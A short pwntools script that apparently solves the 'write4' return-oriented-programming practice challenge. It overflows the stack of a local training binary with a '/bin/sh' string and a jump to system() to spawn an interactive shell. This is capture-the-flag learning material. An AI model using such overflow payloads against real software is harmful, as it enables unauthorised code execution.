#!/usr/bin/env python
"""

Stack found at offset: 40
RDI at offset 1


|           0x00400810      e8cbfdffff     call sym.imp.system         ; int system(const char *string)

  0x00400893                 5f  pop rdi
  0x00400894                 c3  ret

"""

from pwn import *


payload = "\x00/bin/sh\x00" + "A"*31 + p64(0x00400810)

p = process('./bin/write4/write4')
p.recvuntil("ady!")
p.sendline(payload)
p.interactive()